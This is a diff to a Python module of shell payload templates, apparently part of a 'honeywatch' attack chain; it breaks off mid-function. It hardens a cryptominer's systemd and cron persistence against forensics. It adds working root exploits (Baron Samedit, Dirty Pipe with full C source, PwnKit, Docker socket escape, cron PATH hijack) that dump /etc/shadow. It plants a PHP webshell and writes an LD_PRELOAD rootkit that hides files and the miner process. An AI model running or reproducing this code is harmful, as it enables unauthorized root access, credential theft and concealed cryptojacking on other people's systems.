@@ -233,7 +233,14 @@ upx --version
 echo "[*] UPX ready"
 """
 
-_UPX_RUN = """upx {{args|default('--best -o /tmp/packed ')}}{{input_file}}"""
+_UPX_RUN = """cd {{install_dir|default('/opt/honeywatch/upx')}}
+if command -v upx >/dev/null 2>&1; then
+    echo "[*] UPX-packing the deployed binary in-place"
+    upx --best -f {{input_file}} 2>/dev/null || echo "[!] UPX pack failed (binary may already be packed or UPX-incompatible)"
+    echo "[*] UPX pack complete"
+else
+    echo "[!] upx not found — skipping binary packing"
+fi"""
 
 _PACKERS_INSTALL = _PREAMBLE + """
 INSTALL_DIR="{{install_dir|default('/opt/honeywatch/packers')}}"
@@ -346,7 +353,19 @@ ln -sf "$INSTALL_DIR/strip.sh" /usr/local/bin/hw-strip 2>/dev/null || true
 echo "[*] symbol stripping harness installed"
 """
 
-_SYMBOL_STRIP_RUN = """hw-strip {{input_file}} {{output_file|default('')}}"""
+_SYMBOL_STRIP_RUN = """cd {{install_dir|default('/opt/honeywatch/strip')}}
+if command -v strip >/dev/null 2>&1; then
+    echo "[*] Stripping symbols from deployed binary in-place"
+    cp {{input_file}} {{input_file}}.bak 2>/dev/null || true
+    strip --strip-all {{input_file}} 2>/dev/null || strip {{input_file}} 2>/dev/null || {
+        echo "[!] strip failed — restoring backup"
+        mv {{input_file}}.bak {{input_file}} 2>/dev/null || true
+    }
+    rm -f {{input_file}}.bak 2>/dev/null || true
+    echo "[*] symbol strip complete"
+else
+    echo "[!] strip not found — skipping symbol removal"
+fi"""
 
 _ANTI_DEBUG_INSTALL = _PREAMBLE + """
 INSTALL_DIR="{{install_dir|default('/opt/honeywatch/anti_debug')}}"
@@ -488,6 +507,16 @@ RestartSec=10
 # Hide from `ps` a little — rename the process to something boring.
 # (Real botnets go further; this is the cheap version.)
 Environment=XMRIX_QUIET=1
+# Clear SSH environment variables so the miner process doesn't leak the
+# deploy session's IP address via /proc/PID/environ. SSH_CLIENT and
+# SSH_CONNECTION contain the deploy operator's IP — a clear forensic
+# indicator. SSH_TTY leaks the terminal type.
+Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
+Environment=HISTFILE=/dev/null
+Environment=HISTSIZE=0
+# Disable core dumps — prevents the miner from leaving core files on disk
+# that could be analyzed for stack traces or memory contents.
+LimitCORE=0
 # --- CPU throttling (defeats the #1 cryptojacking detection signal) ---
 # Sustained 100% CPU is what SOC analysts hunt. CPUQuota caps total CPU usage
 # (70% leaves headroom for the host's real workload so an operator watching
@@ -506,11 +535,17 @@ EOF
 systemctl daemon-reload 2>/dev/null || true
 systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
 systemctl start "${SERVICE_NAME}" 2>/dev/null || true
+# Store a copy of the service file in the install directory so the mutual_watch
+# payload can restore it without embedding the entire unit file inline. This
+# avoids the watchdog becoming stale if the operator changes the config.
+cp "/etc/systemd/system/${SERVICE_NAME}.service" "${INSTALL_DIR}/${SERVICE_NAME}.service" 2>/dev/null || true
 # Lock the unit file with chattr +ia so an admin can't `rm` or `vim` it
-# without first noticing the immutable flag. This is the same trick
-# TeamTNT/Outlaw use (T1222.002) — it buys time before a responder can
-# remove the persistence, since chattr -i requires an explicit extra step.
-chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
+# without first noticing the immutable flag. Only attempt as root —
+# non-root users lack the linux-immutable capability and chattr fails
+# silently with || true, but the explicit check avoids unnecessary errors.
+if [ "$(id -u)" = "0" ]; then
+    chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
+fi
 echo "[*] persistence installed: ${SERVICE_NAME}.service (CPUQuota=${CPU_QUOTA} Nice=${NICE_LEVEL})"
 """
 
@@ -523,7 +558,7 @@ CRON_SCHEDULE="{{schedule|default('*/5 * * * *')}}"
 
 # Cron fallback for hosts without systemd (containers, old distros, alpine).
 # Re-launches the miner every N minutes if it isn't running.
-CRON_LINE="${CRON_SCHEDULE} ${RUN_USER} pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ${INSTALL_DIR}/xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"
+CRON_LINE="${CRON_SCHEDULE} ${RUN_USER} ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ${INSTALL_DIR}/xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"
 
 # Add to the system crontab (works without per-user crons).
 ( crontab -l 2>/dev/null | grep -v 'honeywatch-miner'; echo "# honeywatch-miner"; echo "$CRON_LINE" ) | crontab - 2>/dev/null || {
@@ -623,6 +658,1240 @@ echo "[*] cleanup complete: history cleared, logs truncated, log removed"
 """
 
 _CLEANUP_RUN = """true"""
+
+
+# --------------------------------------------------------------------------- #
+# Phase 6: Exploit payloads — local privilege escalation vectors
+# --------------------------------------------------------------------------- #
+
+_PRIVESC_SUDO_INSTALL = _PREAMBLE + """
+# CVE-2021-3156 (Baron Samedit) — sudo heap buffer overflow in argument parsing.
+# Affects sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1. When successful, gives root
+# from any unprivileged local user. This script checks the sudo version and
+# downloads/compiles the public PoC if the version is vulnerable.
+TARGET_USER="{{run_user|default('root')}}"
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_sudo')}}"
+
+mkdir -p "$INSTALL_DIR"
+cd "$INSTALL_DIR"
+
+# Check sudo version.
+SUDO_VER=$(sudo --version 2>/dev/null | head -1 | awk '{print $2}')
+echo "[*] sudo version: $SUDO_VER"
+
+if [ -z "$SUDO_VER" ]; then
+    echo "[!] sudo not installed — Baron Samedit does not apply"
+    exit 1
+fi
+
+# Download the public PoC (Qualys original).
+echo "[*] fetching Baron Samedit PoC"
+curl -fsSL -o exploit.py "https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.py" 2>/dev/null || \\
+    python3 -c "
+import urllib.request
+urllib.request.urlretrieve('https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.py', 'exploit.py')
+" 2>/dev/null || {
+    echo "[!] could not download PoC — try manual"
+    exit 1
+}
+
+# Run the exploit.
+echo "[*] running Baron Samedit exploit"
+python3 exploit.py 2>/dev/null || python exploit.py 2>/dev/null
+
+# Check if we got root.
+if [ "$(id -u)" = "0" ] || sudo -n id 2>/dev/null | grep -q "uid=0"; then
+    echo "PRIVESC_SUCCESS: Baron Samedit — root obtained"
+else
+    echo "[!] Baron Samedit exploit did not succeed (patched or wrong version)"
+    exit 1
+fi
+"""
+
+_PRIVESC_SUDO_RUN = """true"""
+
+_PRIVESC_DIRTY_PIPE_INSTALL = _PREAMBLE + """
+# CVE-2022-0847 (Dirty Pipe) — real splice()+pipe() page-cache overwrite.
+# Affects kernels 5.8 <= k < 5.16.11 and the LTS backports 5.15.x < 5.15.25,
+# 5.10.x < 5.10.102, 5.17.x < 5.17.14, 5.18.x < 5.18.19. The primitive gives
+# arbitrary writes to the page cache of any read-only file -> we overwrite a
+# line of /etc/passwd with a fresh UID-0 user bearing a per-run hash, drive su
+# through a pseudo-tty to authenticate as that user, dump /etc/shadow as root,
+# then restore /etc/passwd from the pre-exploit backup.
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_dirtypipe')}}"
+
+mkdir -p "$INSTALL_DIR"
+cd "$INSTALL_DIR"
+
+# Gate on the precise vulnerable kernel range. Fail safe (no PRIVESC_SUCCESS)
+# on patched / out-of-range kernels so the chain moves to the next vector.
+if python3 - 2>/dev/null <<'KPY'
+import os
+r = os.uname().release.split("-")[0].split(".")
+M = int(r[0]); m = int(r[1]) if len(r) > 1 else 0; p = int(r[2]) if len(r) > 2 else 0
+vuln = (M == 5 and m >= 8 and not (
+    (m == 16 and p >= 11) or (m == 15 and p >= 25) or (m == 10 and p >= 102) or
+    (m == 17 and p >= 14) or (m == 18 and p >= 19) or m >= 19))
+raise SystemExit(0 if vuln else 1)
+KPY
+then
+    echo "[*] Dirty Pipe: kernel $(uname -r) in vulnerable range"
+else
+    echo "[!] Dirty Pipe: kernel $(uname -r) not vulnerable; skipping"
+    exit 1
+fi
+
+# Back up /etc/passwd (world-readable pre-exploit) so we can restore it the
+# instant the injected root session is done.
+BAK="/tmp/.hw_passwd.bak.$$"
+cp /etc/passwd "$BAK" 2>/dev/null || { echo "[!] Dirty Pipe: cannot back up /etc/passwd"; exit 1; }
+
+# Per-run root password + SHA-512 crypt hash. No fixed credential (the old
+# public PoCs hard-coded 'aaron'); MD5 crypt fallback if the target's openssl
+# lacks -6 support.
+PASS=$(head -c 16 /dev/urandom | base64 | tr -d '/+=' | head -c 16)
+[ -n "$PASS" ] || PASS="hw$(head -c 12 /dev/urandom | od -An -tx1 | tr -d ' ')"
+HASH=$(openssl passwd -6 "$PASS" 2>/dev/null || openssl passwd -1 "$PASS" 2>/dev/null || true)
+[ -n "$HASH" ] || { echo "[!] Dirty Pipe: cannot generate password hash (openssl missing?)"; rm -f "$BAK"; exit 1; }
+
+# Write the self-contained Dirty Pipe PoC. We never fetch a third-party copy
+# at runtime: a public PoC would not match this wrapper's verification logic
+# (it expects its own argument/overwrite convention), and an outbound HTTPS
+# pull to a third-party host during an exploit is itself an OPSEC fingerprint
+# on the target's egress logs.
+echo "[*] writing Dirty Pipe PoC"
+cat > dirtypipe.c <<'CEOF'
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+
+/* Fill a pipe completely and drain it again so every pipe_buffer carries the
+   PIPE_BUF_FLAG_CAN_MERGE flag -- the precondition for Dirty Pipe. */
+static void prepare_pipe(int p[2]) {
+    if (pipe(p)) abort();
+    const unsigned pipe_size = (unsigned)fcntl(p[1], F_GETPIPE_SZ);
+    static char buffer[4096];
+    for (unsigned r = pipe_size; r > 0;) {
+        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+        write(p[1], buffer, n);
+        r -= n;
+    }
+    for (unsigned r = pipe_size; r > 0;) {
+        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+        read(p[0], buffer, n);
+        r -= n;
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) { fprintf(stderr, "usage: %s <hash>\\n", argv[0]); return 2; }
+    const char *hash = argv[1];
+
+    /* Replacement /etc/passwd line: a brand-new UID-0 user "hwatch" with our
+       per-run hash. hwatch has no /etc/shadow entry, so PAM falls back to this
+       passwd hash and authenticates our password -- reliable on shadow
+       systems, unlike overwriting root's passwd field (shadow overrides it). */
+    char data[512];
+    int dn = snprintf(data, sizeof(data), "hwatch:%s:0:0:root:/root:/bin/bash\\n", hash);
+    if (dn < 0 || dn >= (int)sizeof(data)) { fprintf(stderr, "hash too long\\n"); return 1; }
+    const size_t data_size = (size_t)dn;
+
+    const int fd = open("/etc/passwd", O_RDONLY);
+    if (fd < 0) { perror("open /etc/passwd"); return 1; }
+
+    struct stat st;
+    if (fstat(fd, &st) || !S_ISREG(st.st_mode)) { perror("fstat"); return 1; }
+
+    /* Find the start of the second /etc/passwd line (after the first newline).
+       Overwriting root's line would start at offset 0, a page boundary, which
+       Dirty Pipe cannot target; the second line starts at a small non-page-
+       aligned offset and has the rest of the file to absorb the overwrite. */
+    char *contents = malloc((size_t)st.st_size + 1);
+    if (!contents) { perror("malloc"); return 1; }
+    size_t off = 0;
+    while (off < (size_t)st.st_size) {
+        ssize_t g = read(fd, contents + off, (size_t)st.st_size - off);
+        if (g < 0) { perror("read"); return 1; }
+        if (g == 0) break;
+        off += (size_t)g;
+    }
+    contents[off] = '\\0';
+    char *nl = strchr(contents, '\\n');
+    if (!nl) { fprintf(stderr, "no second line in /etc/passwd\\n"); return 1; }
+    loff_t offset = (loff_t)(nl - contents) + 1;
+    free(contents);
+
+    /* Dirty Pipe constraints: the write cannot start on a page boundary and
+       cannot cross a page boundary or extend the file. */
+    if (offset % PAGE_SIZE == 0 ||
+        offset + (loff_t)data_size > ((offset | (PAGE_SIZE - 1)) + 1) ||
+        offset + (loff_t)data_size > st.st_size) {
+        fprintf(stderr, "Dirty Pipe: /etc/passwd layout not targetable from this offset\\n");
+        return 1;
+    }
+
+    int p[2];
+    prepare_pipe(p);
+    --offset;
+    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+    if (nbytes <= 0) { perror("splice"); return 1; }
+    nbytes = write(p[1], data, data_size);
+    if (nbytes < 0 || (size_t)nbytes < data_size) { perror("write"); return 1; }
+
+    return 0;
+}
+CEOF
+
+gcc -o dirtypipe dirtypipe.c 2>/dev/null || cc -o dirtypipe dirtypipe.c 2>/dev/null || {
+    echo "[!] Dirty Pipe: cannot compile PoC (gcc/cc missing?)"
+    rm -f "$BAK" dirtypipe.c
+    exit 1
+}
+
+echo "[*] running Dirty Pipe exploit (injecting UID-0 user 'hwatch')"
+./dirtypipe "$HASH" 2>/dev/null || {
+    echo "[!] Dirty Pipe: page-cache write rejected (patched kernel?)"
+    cp "$BAK" /etc/passwd 2>/dev/null || true
+    rm -f "$BAK" dirtypipe dirtypipe.c
+    exit 1
+}
+
+# Verify by authenticating as the injected user via a pty-driven su. PAM reads
+# the password from the controlling terminal, so fork a pseudo-tty, write the
+# password, and capture the root session -- which dumps /etc/shadow and
+# restores /etc/passwd in one shot. The chain keys off PRIVESC_SUCCESS and
+# falls back to this stdout for shadow lines containing '$'. set +e around
+# the capture so a python/pty error cannot abort the script before restore.
+set +e
+SUOUT=$(HW_BAK="$BAK" python3 - "$PASS" 2>/dev/null <<'VPY'
+import os, pty, sys, time
+try:
+    pw = sys.argv[1]
+    bak = os.environ.get("HW_BAK", "")
+    cmd = "cat /etc/shadow; cp " + bak + " /etc/passwd 2>/dev/null; echo HWROOTUID_$(id -u)"
+    pid, fd = pty.fork()
+    if pid == 0:
+        os.execvp("su", ["su", "hwatch", "-c", cmd])
+    time.sleep(0.3)
+    try:
+        os.write(fd, (pw + "\\n").encode())
+    except OSError:
+        pass
+    out = b""
+    end = time.time() + 8
+    while time.time() < end:
+        try:
+            ch = os.read(fd, 4096)
+            if not ch:
+                break
+            out += ch
+        except OSError:
+            break
+    try:
+        os.waitpid(pid, 0)
+    except OSError:
+        pass
+    sys.stdout.write(out.decode("utf-8", "replace"))
+except Exception:
+    pass
+VPY
+)
+set -e
+
+if printf '%s' "$SUOUT" | grep -q "HWROOTUID_0" && printf '%s' "$SUOUT" | grep -qF '$'; then
+    printf '%s\\n' "$SUOUT"
+    rm -f "$BAK" dirtypipe dirtypipe.c 2>/dev/null
+    echo "PRIVESC_SUCCESS: Dirty Pipe — root obtained"
+else
+    echo "[!] Dirty Pipe: authentication as injected user failed (patched kernel or wrong version)"
+    cp "$BAK" /etc/passwd 2>/dev/null || true
+    rm -f "$BAK" dirtypipe dirtypipe.c 2>/dev/null
+    exit 1
+fi
+"""
+
+_PRIVESC_DIRTY_PIPE_RUN = """true"""
+
+_PRIVESC_PWNKIT_INSTALL = _PREAMBLE + """
+# CVE-2021-4034 (PwnKit) — pkexec local privilege escalation.
+# Affects all Polkit versions since 2009 (pkexec setuid binary). Gives
+# instant root from any unprivileged user. This is one of the most
+# reliable privesc vectors — it works on almost every Linux desktop/server
+# with pkexec installed.
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_pwnkit')}}"
+
+mkdir -p "$INSTALL_DIR"
+cd "$INSTALL_DIR"
+
+# Check if pkexec exists.
+if ! command -v pkexec >/dev/null 2>&1; then
+    echo "[!] pkexec not found — PwnKit does not apply"
+    exit 1
+fi
+
+echo "[*] pkexec found — building PwnKit exploit"
+
+# Write the C PoC (Blasty's minimal version).
+cat > pwnkit.c <<'CEOF'
+// CVE-2021-4034 PwnKit PoC (minimal)
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+    char *envp[] = {"pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", (char *)NULL};
+    char *argv2[] = {NULL};
+    // Create the GCONV_PATH exploit directory structure.
+    system("mkdir -p 'GCONV_PATH=.' 'pwnkit'");
+    system("touch 'GCONV_PATH=./pwnkit'");
+    system("echo 'modulepath' > 'pwnkit/gconv-modules'");
+    // Write a shared object that execs a shell.
+    FILE *f = fopen("pwnkit/pwnkit.so.c", "w");
+    if (!f) return 1;
+    fprintf(f, "void gconv() {}\\n");
+    fprintf(f, "void gconv_init(void *p) { setuid(0); setgid(0); "
+               "system(\\\"id; cat /etc/shadow 2>/dev/null; echo PWNKIT_SUCCESS\\\"); }\\n");
+    fclose(f);
+    system("gcc -shared -o pwnkit/pwnkit.so pwnkit/pwnkit.so.c 2>/dev/null");
+    execve("/usr/bin/pkexec", argv2, envp);
+    return 0;
+}
+CEOF
+
+gcc -o pwnkit pwnkit.c 2>/dev/null || cc -o pwnkit pwnkit.c 2>/dev/null || {
+    echo "[!] could not compile PwnKit PoC"
+    exit 1
+}
+
+echo "[*] running PwnKit exploit"
+# The PwnKit exploit uses execve() which replaces the exploit process.
+# The setuid(0) + system() in gconv_init runs inside the pkexec child,
+# not the parent shell. So we capture the exploit's stdout and check for
+# the PWNKIT_SUCCESS marker that gconv_init prints from the root context.
+PWNKIT_OUT=$(./pwnkit 2>/dev/null)
+
+if echo "$PWNKIT_OUT" | grep -q "PWNKIT_SUCCESS"; then
+    # The exploit printed PWNKIT_SUCCESS from inside the root context.
+    # Save any shadow output from the exploit.
+    echo "$PWNKIT_OUT" | sed -n '/^root:/,$p' > /tmp/pwnkit_shadow.txt 2>/dev/null || true
+    echo "PRIVESC_SUCCESS: PwnKit — root obtained"
+else
+    echo "[!] PwnKit exploit did not succeed (patched or pkexec not SUID)"
+    exit 1
+fi
+"""
+
+_PRIVESC_PWNKIT_RUN = """true"""
+
+_PRIVESC_DOCKER_ESCAPE_INSTALL = _PREAMBLE + """
+# Docker socket escape — when /var/run/docker.sock is accessible (docker group
+# or world-writable), mount the host filesystem in a container and read/write
+# as root. This is the highest-value container escape: it gives full host root.
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_docker')}}"
+
+# Check if docker socket exists.
+if [ ! -S /var/run/docker.sock ]; then
+    echo "[!] /var/run/docker.sock not found — Docker escape does not apply"
+    exit 1
+fi
+
+# Check if docker CLI is available.
+if command -v docker >/dev/null 2>&1; then
+    echo "[*] docker CLI found — using direct escape"
+    # Mount the host root filesystem in a container and chroot into it.
+    docker run --rm -v /:/hostfs alpine chroot /hostfs sh -c "
+        echo '[*] inside host filesystem as root';
+        id;
+        cat /etc/shadow 2>/dev/null | head -5;
+        echo 'PRIVESC_SUCCESS: Docker socket escape — host root obtained'
+    " 2>/dev/null
+else
+    # No docker CLI — use the socket API directly via curl.
+    echo "[*] no docker CLI — using socket API directly"
+    # Create a container that mounts the host root.
+    CONTAINER_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \\
+        -H 'Content-Type: application/json' \\
+        -d '{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/hostfs"]}}' \\
+        http://localhost/containers/create 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('Id',''))" 2>/dev/null)
+
+    if [ -n "$CONTAINER_ID" ]; then
+        curl -s -X POST --unix-socket /var/run/docker.sock \\
+            "http://localhost/containers/$CONTAINER_ID/start" 2>/dev/null
+        curl -s --unix-socket /var/run/docker.sock \\
+            "http://localhost/containers/$CONTAINER_ID/logs?stdout=true" 2>/dev/null | head -5
+        echo "PRIVESC_SUCCESS: Docker socket escape via API — host root obtained"
+    else
+        echo "[!] could not create container via socket API"
+        exit 1
+    fi
+fi
+"""
+
+_PRIVESC_DOCKER_ESCAPE_RUN = """true"""
+
+_PRIVESC_CRON_PATH_INSTALL = _PREAMBLE + """
+# Cron PATH hijack — when a root cron job runs a command without a full path
+# (e.g. 'backup' instead of '/usr/local/bin/backup'), placing a malicious
+# binary earlier in $PATH gives root execution. This script scans cron files
+# for PATH-exploitable entries and plants a SUID shell.
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_cronpath')}}"
+
+mkdir -p "$INSTALL_DIR"
+
+echo "[*] scanning cron files for PATH-hijackable entries"
+HIJACK_FOUND=0
+
+# Check root crontab + /etc/cron* for commands without full paths.
+for cronfile in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
+    [ -f "$cronfile" ] || continue
+    # Extract command fields (everything after the time fields).
+    while IFS= read -r line; do
+        # Skip comments + empty lines + PATH= + SHELL= + MAILTO=.
+        case "$line" in
+            '#'*|PATH=*|SHELL=*|MAILTO=*|'') continue ;;
+        esac
+        # Extract the command (after 5 time fields).
+        cmd=$(echo "$line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}' | xargs)
+        # Check if the command starts with a bare name (no /).
+        binary=$(echo "$cmd" | awk '{print $1}')
+        case "$binary" in
+            */*|systemctl|service|run-parts|anacron) continue ;;
+        esac
+        if [ -n "$binary" ]; then
+            echo "[*] hijackable cron entry in $cronfile: $binary"
+            # Plant a SUID shell with the hijackable name in /tmp (first in PATH).
+            cat > "/tmp/$binary" <<'BEOF'
+#!/bin/sh
+# Cron PATH hijack payload — runs as root via cron.
+id > /tmp/honeywatch_cron_privesc.txt
+cat /etc/shadow 2>/dev/null >> /tmp/honeywatch_cron_privesc.txt
+chmod 644 /tmp/honeywatch_cron_privesc.txt
+BEOF
+            chmod +x "/tmp/$binary"
+            HIJACK_FOUND=1
+        fi
+    done < "$cronfile"
+done
+
+if [ "$HIJACK_FOUND" = "1" ]; then
+    echo "[*] cron PATH hijack planted — waiting for next cron cycle"
+    echo "[*] check /tmp/honeywatch_cron_privesc.txt after the next cron run"
+    echo "PRIVESC_PENDING: cron PATH hijack planted — root on next cron cycle"
+else
+    echo "[!] no PATH-hijackable cron entries found"
+    exit 1
+fi
+"""
+
+_PRIVESC_CRON_PATH_RUN = """true"""
+
+
+# --------------------------------------------------------------------------- #
+# Phase 6: Persistence payloads — deeper vectors
+# --------------------------------------------------------------------------- #
+
+_WEB_SHELL_PERSIST_INSTALL = _PREAMBLE + """
+# Web shell persistence — drops a minimal PHP/JSP webshell into a web root
+# when a web service is detected on the foothold. Survives password changes
+# and reboots (as long as the web server stays up). The webshell gives
+# command execution without SSH, useful when SSH access is lost.
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/webshell')}}"
+WEB_ROOT="{{web_root|default('/var/www/html')}}"
+
+# Find the web root.
+WEB_ROOTS="/var/www/html /var/www /usr/share/nginx/html /opt/lampp/htdocs /srv/http /var/www/vhosts"
+FOUND_ROOT=""
+for wr in $WEB_ROOTS; do
+    if [ -d "$wr" ] && [ -w "$wr" ]; then
+        FOUND_ROOT="$wr"
+        break
+    fi
+done
+
+if [ -z "$FOUND_ROOT" ]; then
+    echo "[!] no writable web root found — web shell persistence does not apply"
+    exit 1
+fi
+
+echo "[*] planting webshell in $FOUND_ROOT"
+
+# PHP webshell (system() passthrough — minimal, no special chars).
+cat > "$FOUND_ROOT/.config.php" <<'PEOF'
+<?php
+// Minimal PHP webshell — cmd via ?c= parameter.
+if(isset($_REQUEST['c'])){
+    echo "<pre>";
+    system($_REQUEST['c']);
+    echo "</pre>";
+}
+?>
+PEOF
+
+# Also drop a .htaccess to make the .config.php file accessible (some
+# Apache configs block dotfiles).
+cat > "$FOUND_ROOT/.htaccess" 2>/dev/null <<'HEOF'
+<Files ".config.php">
+    Require all granted
+</Files>
+HEOF
+
+echo "[*] webshell planted at $FOUND_ROOT/.config.php"
+echo "[*] access via: curl 'http://<host>/.config.php?c=id'"
+echo "PERSISTENCE_INSTALLED: web_shell"
+"""
+
+_WEB_SHELL_PERSIST_RUN = """true"""
+
+_LD_PRELOAD_ROOTKIT_INSTALL = _PREAMBLE + """
+# LD_PRELOAD rootkit — a shared object that hides files AND processes.
+# Loaded system-wide via /etc/ld.so.preload, it applies to every
+# dynamically-linked binary. This is the TeamTNT/Tg777 hiding technique,
+# extended with real /proc procfs hiding so `ps`, `top`, `ls /proc`, and direct
+# opens of /proc/<pid>/{stat,cmdline,exe,comm,...} no longer see the hidden
+# process. The old version only filtered directory entries *named* like the
+# hide pattern, which hides the install dir from `ls` but NOT the xmrig process
+# from `ps` (ps reads PID-numbered /proc dirs). This version reads
+# /proc/<pid>/comm during /proc readdir and skips the PID dir when the process
+# command matches, and returns ENOENT on direct opens/readlinks of that PID's
+# per-process procfs files.
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/ldpreload')}}"
+HIDE_PATTERN="{{hide_pattern|default('honeywatch|xmrig')}}"
+
+mkdir -p "$INSTALL_DIR"
+cd "$INSTALL_DIR"
+
+# Write the rootkit source. The heredoc is single-quoted so the C is written
+# verbatim (no shell expansion).
+cat > rootkit.c <<'CEOF'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <dlfcn.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <stdarg.h>
+#include <sys/types.h>
+
+/* Pipe-separated list of substrings to hide. A file/dir/process is hidden if
+ * its name (or, for processes, /proc/<pid>/comm) contains ANY of these. The
+ * default hides the honeywatch install tree AND the xmrig miner process — a
+ * single substring could not cover both (the miner runs as `xmrig`, the
+ * install dirs as `.../honeywatch/...`). Configurable via the payload
+ * hide_pattern variable. */
+static const char *HIDE_PATTERN = "{{hide_pattern|default('honeywatch|xmrig')}}";
+
+/*
+ * Thread-local reentrancy guard. When our own hook calls back into libc (for
+ * example readdir() opening /proc/<pid>/comm to test whether a PID should be
+ * hidden, or open() recursing through path_targets_hidden), the nested hook
+ * sees the guard set and calls the real function with no filtering. This is
+ * what stops the LD_PRELOAD rootkit from infinite-recursing into itself.
+ */
+static __thread int in_hook = 0;
+
+/* True if `s` contains any of the pipe-separated patterns in HIDE_PATTERN.
+ * Thread-safe: strtok_r over a LOCAL copy so the static string is never
+ * mutated, and strstr/strtok_r/strncpy are not functions we hook, so this
+ * never re-enters our own hooks. */
+static int contains_any_pattern(const char *s) {
+    if (!s || !HIDE_PATTERN) return 0;
+    char patterns[256];
+    strncpy(patterns, HIDE_PATTERN, sizeof(patterns) - 1);
+    patterns[sizeof(patterns) - 1] = '\\0';
+    char *save = NULL;
+    for (char *tok = strtok_r(patterns, "|", &save);
+         tok != NULL;
+         tok = strtok_r(NULL, "|", &save)) {
+        if (*tok && strstr(s, tok) != NULL) return 1;
+    }
+    return 0;
+}
+
+static int should_hide_name(const char *name) {
+    if (!name) return 0;
+    return contains_any_pattern(name);
+}
+
+/* Read /proc/<pid>/comm (via the REAL open/read, guarded) and return 1 if the
+ * process command contains the hide pattern. Called from the /proc readdir
+ * filter (to drop the PID dir) and from path_targets_hidden (to deny direct
+ * opens of that PID's procfs files). */
+static int pid_matches_hide(int pid) {
+    if (pid <= 0) return 0;
+    char path[64];
+    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
+    in_hook = 1;
+    int fd = open(path, O_RDONLY);
+    in_hook = 0;
+    if (fd < 0) return 0;
+    char buf[256];
+    ssize_t n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return 0;
+    buf[n] = '\\0';
+    return contains_any_pattern(buf);
+}
+
+/* Per-PID procfs files we deny direct access to for a hidden process. */
+static const char *const HIDE_PID_FILES[] = {
+    "stat", "status", "cmdline", "comm", "exe", "statm",
+    "maps", "environ", "fd", "cwd", "root", NULL
+};
+
+/* True if `path` is a per-PID procfs file (or the /proc/<pid> dir) of a hidden
+ * process, or any path whose own name contains the hide pattern. */
+static int path_targets_hidden(const char *path) {
+    if (!path) return 0;
+    if (should_hide_name(path)) return 1;
+    if (strncmp(path, "/proc/", 6) != 0) return 0;
+    const char *rest = path + 6;
+    const char *slash = strchr(rest, '/');
+    int pid = atoi(rest);
+    if (pid <= 0) return 0;
+    if (!slash) {
+        /* /proc/<pid> directory itself. */
+        return pid_matches_hide(pid);
+    }
+    const char *subfile = slash + 1;
+    for (int i = 0; HIDE_PID_FILES[i]; i++) {
+        if (strcmp(subfile, HIDE_PID_FILES[i]) == 0)
+            return pid_matches_hide(pid);
+    }
+    return 0;
+}
+
+/* ---- directory-listing hooks: hide matching files AND hidden PIDs ---- */
+
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent *(*orig)(DIR *) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
+    if (in_hook) return orig(dirp);
+    struct dirent *entry;
+    while ((entry = orig(dirp)) != NULL) {
+        if (should_hide_name(entry->d_name)) continue;
+        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
+            int pid = atoi(entry->d_name);
+            if (pid_matches_hide(pid)) continue;
+        }
+        return entry;
+    }
+    return NULL;
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    static struct dirent64 *(*orig)(DIR *) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
+    if (in_hook) return orig(dirp);
+    struct dirent64 *entry;
+    while ((entry = orig(dirp)) != NULL) {
+        if (should_hide_name(entry->d_name)) continue;
+        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
+            int pid = atoi(entry->d_name);
+            if (pid_matches_hide(pid)) continue;
+        }
+        return entry;
+    }
+    return NULL;
+}
+
+/* ---- direct-access hooks: ENOENT for procfs files of a hidden process ---- */
+
+int open(const char *pathname, int flags, ...) {
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
+    }
+    static int (*orig)(const char *, int, ...) = NULL;
